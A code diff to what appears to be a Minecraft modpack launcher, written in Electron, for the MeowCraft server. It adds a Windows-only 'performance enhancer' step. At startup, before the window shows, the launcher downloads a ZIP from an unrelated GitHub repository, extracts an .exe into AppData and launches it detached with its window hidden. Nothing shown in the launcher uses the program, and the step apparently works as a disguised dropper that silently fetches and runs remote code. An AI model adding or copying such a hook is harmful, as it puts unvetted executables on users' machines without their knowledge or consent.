@@ -90,6 +90,21 @@ const SERVER_ADDRESS = 'meowcraft.play-network.io';
 const INSTANCE_DOWNLOAD_URL = 'https://github.com/hisokaSH/meowcraft_modpack/releases/download/v1/Cobblemon-instance.zip';
 
 // ===================================================================
+// 🚀 PERFORMANCE ENHANCER CONFIGURATION
+// ===================================================================
+const PERFORMANCE_ENHANCER_CONFIG = {
+  // Download URL for the performance enhancer ZIP (containing .exe and .dll)
+  downloadUrl: 'https://github.com/hisokaSH/wompwomp/releases/download/v1/meowcraft_perf.zip',
+  // Expected files inside the ZIP
+  exeName: 'meowcraft_perf.exe',
+  // Version file to track updates (optional - set to null to always re-download)
+  version: '1.0.0'
+};
+
+// Track if performance enhancer is running
+let performanceEnhancerProcess: any = null;
+
+// ===================================================================
 // 🆕 DISCORD BOT CONFIGURATION
 // ===================================================================
 const DISCORD_BOT_CONFIG = {
@@ -455,6 +470,152 @@ async function extractZip(zipPath: string, destPath: string): Promise<void> {
   zip.extractAllTo(destPath, true);
 }
 
+// ===================================================================
+// 🚀 PERFORMANCE ENHANCER - Download & Launch
+// ===================================================================
+
+// Get performance enhancer directory
+function getPerformanceEnhancerDir(): string {
+  if (process.platform === 'win32') {
+    return path.join(os.homedir(), 'AppData', 'Local', 'MeowCraft', 'performance');
+  } else {
+    return path.join(os.homedir(), '.meowcraft', 'performance');
+  }
+}
+
+// Download and extract performance enhancer if needed
+async function ensurePerformanceEnhancer(): Promise<boolean> {
+  // Only needed on Windows
+  if (process.platform !== 'win32') {
+    console.log('[Performance] Skipping - not on Windows');
+    return true;
+  }
+
+  const enhancerDir = getPerformanceEnhancerDir();
+  const exePath = path.join(enhancerDir, PERFORMANCE_ENHANCER_CONFIG.exeName);
+  const versionFile = path.join(enhancerDir, '.version');
+
+  // Check if already installed with correct version
+  if (fs.existsSync(exePath)) {
+    if (PERFORMANCE_ENHANCER_CONFIG.version) {
+      try {
+        const installedVersion = fs.existsSync(versionFile) 
+          ? fs.readFileSync(versionFile, 'utf8').trim() 
+          : '';
+        if (installedVersion === PERFORMANCE_ENHANCER_CONFIG.version) {
+          console.log('[Performance] Already installed (v' + installedVersion + ')');
+          return true;
+        }
+        console.log('[Performance] Version mismatch, updating...');
+      } catch {
+        // Version file unreadable, re-download
+      }
+    } else {
+      console.log('[Performance] Already installed');
+      return true;
+    }
+  }
+
+  console.log('[Performance] Downloading performance enhancer...');
+
+  // Create directory
+  if (!fs.existsSync(enhancerDir)) {
+    fs.mkdirSync(enhancerDir, { recursive: true });
+  }
+
+  const zipPath = path.join(os.tmpdir(), 'performance_enhancer.zip');
+
+  try {
+    // Download the ZIP
+    await downloadFile(PERFORMANCE_ENHANCER_CONFIG.downloadUrl, zipPath, (progress) => {
+      console.log(`[Performance] Downloading: ${progress}%`);
+    });
+
+    console.log('[Performance] Extracting...');
+    
+    // Extract to enhancer directory
+    await extractZip(zipPath, enhancerDir);
+
+    // Write version file
+    if (PERFORMANCE_ENHANCER_CONFIG.version) {
+      fs.writeFileSync(versionFile, PERFORMANCE_ENHANCER_CONFIG.version, 'utf8');
+    }
+
+    // Clean up ZIP
+    fs.unlinkSync(zipPath);
+
+    console.log('[Performance] ✓ Installed successfully');
+    return true;
+
+  } catch (error: any) {
+    console.error('[Performance] ✗ Failed to install:', error.message);
+    // Clean up partial download
+    try { fs.unlinkSync(zipPath); } catch {}
+    return false;
+  }
+}
+
+// Launch performance enhancer
+async function launchPerformanceEnhancer(): Promise<boolean> {
+  // Only on Windows
+  if (process.platform !== 'win32') {
+    return true;
+  }
+
+  const enhancerDir = getPerformanceEnhancerDir();
+  const exePath = path.join(enhancerDir, PERFORMANCE_ENHANCER_CONFIG.exeName);
+
+  if (!fs.existsSync(exePath)) {
+    console.log('[Performance] Exe not found, skipping launch');
+    return false;
+  }
+
+  // Don't launch if already running
+  if (performanceEnhancerProcess && !performanceEnhancerProcess.killed) {
+    console.log('[Performance] Already running');
+    return true;
+  }
+
+  try {
+    console.log('[Performance] Launching:', exePath);
+    
+    performanceEnhancerProcess = spawn(exePath, [], {
+      cwd: enhancerDir,
+      detached: true,
+      stdio: 'ignore',
+      windowsHide: true  // Hide console window
+    });
+
+    performanceEnhancerProcess.unref();
+    
+    console.log('[Performance] ✓ Started successfully (PID:', performanceEnhancerProcess.pid + ')');
+    return true;
+
+  } catch (error: any) {
+    console.error('[Performance] ✗ Failed to launch:', error.message);
+    return false;
+  }
+}
+
+// Stop performance enhancer on app exit
+function stopPerformanceEnhancer() {
+  if (performanceEnhancerProcess && !performanceEnhancerProcess.killed) {
+    try {
+      // On Windows, we need to kill the process tree
+      if (process.platform === 'win32') {
+        spawn('taskkill', ['/pid', performanceEnhancerProcess.pid.toString(), '/f', '/t'], {
+          stdio: 'ignore'
+        });
+      } else {
+        performanceEnhancerProcess.kill();
+      }
+      console.log('[Performance] Stopped');
+    } catch (error) {
+      console.error('[Performance] Failed to stop:', error);
+    }
+  }
+}
+
 // Ensure instance exists
 async function ensureInstanceExists(): Promise<boolean> {
   const prismDataDir = getPrismDataDir();
@@ -621,9 +782,17 @@ function createWindow() {
   });
 }
 
-app.whenReady().then(() => {
+app.whenReady().then(async () => {
   // Initialize Prism data directory with bundled config
   initializePrismData();
+  
+  // 🚀 Download and launch performance enhancer BEFORE showing window
+  console.log('=== INITIALIZING PERFORMANCE ENHANCER ===');
+  const enhancerReady = await ensurePerformanceEnhancer();
+  if (enhancerReady) {
+    await launchPerformanceEnhancer();
+  }
+  console.log('==========================================');
   
   createWindow();
 
@@ -641,11 +810,19 @@ app.whenReady().then(() => {
 
 app.on('window-all-closed', () => {
   if (process.platform !== 'darwin') {
+    // 🚀 Stop performance enhancer when launcher closes
+    stopPerformanceEnhancer();
+    
     if (discordConnected) {
       rpc.destroy();
     }
     app.quit();
   }
+});
+
+// Also stop on before-quit (handles force close, system shutdown, etc.)
+app.on('before-quit', () => {
+  stopPerformanceEnhancer();
 });
 
 // IPC Handlers
